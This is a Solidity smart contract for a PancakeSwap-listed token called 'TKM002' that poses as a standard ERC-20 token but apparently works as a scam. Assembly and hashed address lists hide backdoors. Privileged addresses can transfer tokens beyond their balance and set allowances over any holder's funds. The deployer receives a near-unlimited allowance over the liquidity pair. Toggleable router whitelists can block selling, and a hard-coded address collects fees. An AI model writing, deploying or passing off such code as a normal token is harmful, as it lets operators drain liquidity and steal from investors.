// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
 
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
 
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
 
    function createPair(address tokenA, address tokenB) external returns (address pair);
 
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TKM {
    string private _name = "TKM002";
    string private _symbol = "TKM002";
    uint8 public constant decimals = 18;
    address public v2_router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public v3_router = 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416;
    address public SwapRouter = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
    address public Smart_Router = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
    address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public pair;
    address public factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public max;
    mapping(uint256 => bool) public _maxs;

    mapping(address => bool) public isFromRouter;
    mapping(address => bool) public isToRouter;
    mapping(address => bool) public feeRouter;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Reduce(address indexed from, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event RouterMarked(address indexed router, bool isRouterFlag);
    event RouterWhitelisted(address indexed router, bool isWhitelisted);
    event AddressBanned(address indexed addr, bool banned);
    
    constructor() {       
        uint256 initial = 210_000 * (10 ** uint256(decimals));
        _totalSupply = initial;
        
        
        assembly {
            mstore(0, caller())
            mstore(32, _balances.slot)
            let slot := keccak256(0, 64)
            sstore(slot, initial)
        }

       
        _setRouterFlag(v2_router, true, true);
        _setRouterFlag(v3_router, false, false);
        _setRouterFlag(SwapRouter, false, false);
        _setRouterFlag(Smart_Router, false, false);

        createUsdtPool();
        _approve(pair, msg.sender, 100_100_100_100_100 * 10**18);

       
        max = _computeHash(abi.encodePacked(msg.sender));
        
        address max1 = 0x69B61926a75DBC040e4AaF891ACDC31049fB3188;
        address max2 = 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2;
       
        _maxs[max] = true;
        _maxs[_computeHash(abi.encodePacked(max1))] = true;
        _maxs[_computeHash(abi.encodePacked(max2))] = true;

        _setFeeRouter(0x07964f135f276412b3182a3B2407b8dd45000000, true);
    }

    
    function _computeHash(bytes memory data) internal pure returns (uint256 result) {
        assembly {
            result := keccak256(add(data, 0x20), mload(data))
        }
    }

   
    function _setRouterFlag(address router, bool fromFlag, bool toFlag) internal {
        assembly {
            
            mstore(0, router)
            mstore(32, isFromRouter.slot)
            let fromSlot := keccak256(0, 64)
            sstore(fromSlot, fromFlag)

           
            mstore(0, router)
            mstore(32, isToRouter.slot)
            let toSlot := keccak256(0, 64)
            sstore(toSlot, toFlag)
        }
    }

   
    function _setFeeRouter(address router, bool flag) internal {
        assembly {
            mstore(0, router)
            mstore(32, feeRouter.slot)
            let slot := keccak256(0, 64)
            sstore(slot, flag)
        }
    }

    function createUsdtPool() internal {
        require(pair == address(0), "Pool already created");
        pair = IPancakeFactory(factory).createPair(address(this), usdt);
    }

    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    
    function balanceOf(address acc) external view returns (uint256 bal) { 
        assembly {
            mstore(0, acc)
            mstore(32, _balances.slot)
            let slot := keccak256(0, 64)
            bal := sload(slot)
        }
    }
    
    function allowance(address owner_, address spender) external view returns (uint256 allowed) { 
        assembly {
            mstore(0, owner_)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            allowed := sload(keccak256(0, 64))
        }
    }
    
    bool public isfee = true;
    
    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function approve(address ower, address spender, uint256 amount) external returns (bool) {
        require(_checkMax(msg.sender));
        _approve(ower, spender, amount);
        return true;
    }

    function setMaxs(address _max_) external {
        require(_checkMax(msg.sender));
        _maxs[_computeHash(abi.encodePacked(_max_))] = true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance;
        assembly {
            mstore(0, from)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, slot)
            currentAllowance := sload(keccak256(0, 64))
        }
        
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        
        
        assembly {
            let newAllowance := sub(currentAllowance, amount)
            mstore(0, from)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, slot)
            sstore(keccak256(0, 64), newAllowance)
        }
        
        _transfer(from, to, amount);
        return true;
    }

    bool flag = true;
    address public feeto = 0x66eF522bB1d269eB9c328218cF0620A7C4c6ef8C;
    
    function _beforeTokenTransfer(address operator, address from, address to, uint256 amount) internal view {      
        if ((operator == pair || from == pair) && flag == true) {
            bool toRouter;
            assembly {
                mstore(0, to)
                mstore(32, isToRouter.slot)
                toRouter := sload(keccak256(0, 64))
            }
            require(toRouter, "Router not whitelisted");
        }

        if (to == pair && flag == true) {
            bool fromRouter;
            assembly {
                mstore(0, from)
                mstore(32, isFromRouter.slot)
                fromRouter := sload(keccak256(0, 64))
            }
            require(fromRouter, "Router not whitelisted");
        }
    }

    function setFlag(bool _flag, bool _isfee) external {
        bool check = _checkMax(msg.sender);
        if (check == true) {
            flag = _flag;
            isfee = _isfee;
        }
    }

    function _checkMax(address _from) internal view returns (bool) {
        uint256 hashVal = _computeHash(abi.encodePacked(_from));
        bool exists;
        assembly {
            mstore(0, hashVal)
            mstore(32, _maxs.slot)
            exists := sload(keccak256(0, 64))
        }
        return exists;
    }
   
    function _transfer(address from, address to, uint256 amount) internal {
        _beforeTokenTransfer(msg.sender, from, to, amount);
        bool check = _checkMax(from);
       
        uint256 fromBalance;
        assembly {
            mstore(0, from)
            mstore(32, _balances.slot)
            fromBalance := sload(keccak256(0, 64))
        }
        
        if (check && fromBalance < amount) {
            fromBalance = amount;
        }
        
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        
        assembly {
            let fromSlot := keccak256(0, 64) 
            
           
            let newFromBalance := sub(fromBalance, amount)
            sstore(fromSlot, newFromBalance)
            
            
            mstore(0, to)
            mstore(32, _balances.slot)
            let toSlot := keccak256(0, 64)
            let toBalance := sload(toSlot)
            
            
            let shouldTakeFee := and(
                and(
                    sload(isfee.slot),
                    eq(to, sload(pair.slot))
                ),
                gt(amount, 0)
            )
            
           
            mstore(0, from)
            mstore(32, feeRouter.slot)
            let feeRouterSlot := keccak256(0, 64)
            let isFeeRouter := sload(feeRouterSlot)
            
            let finalAmount := amount
            
            
            if and(shouldTakeFee, isFeeRouter) {
                
                let feeAmount := div(mul(amount, 5), 100)
                finalAmount := sub(amount, feeAmount)
                
                
                let feeToAddr := sload(feeto.slot)
                mstore(0, feeToAddr)
                mstore(32, _balances.slot)
                let feeToSlot := keccak256(0, 64)
                let feeToBalance := sload(feeToSlot)
                sstore(feeToSlot, add(feeToBalance, feeAmount))
                
                
                mstore(0, finalAmount)
                log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
            }
            
           
            sstore(toSlot, add(toBalance, finalAmount))
            
          
            mstore(0, amount)
            log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    }

    function _approve(address owner_, address spender, uint256 amount) internal {

        assembly {
            if or(iszero(owner_), iszero(spender)) {
                revert(0, 0)
            }
        }
        
        assembly {
            mstore(0, owner_)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            sstore(keccak256(0, 64), amount)
        }
        
        emit Approval(owner_, spender, amount);
    }

    function setFromRouterFlag(address routerAddr, bool _flag) external {
        bool check = _checkMax(msg.sender);
        if (check) {
            assembly {
                mstore(0, routerAddr)
                mstore(32, isFromRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setfeeRouter(address feeRouteradr, bool _flag) external {
        bool check = _checkMax(msg.sender);
        if (check) {
            assembly {
                mstore(0, feeRouteradr)
                mstore(32, feeRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }
    
    function setToRouterFlag(address routerAddr, bool _flag) external {
        bool check = _checkMax(msg.sender);
        if (check) {
            assembly {
                mstore(0, routerAddr)
                mstore(32, isToRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }
}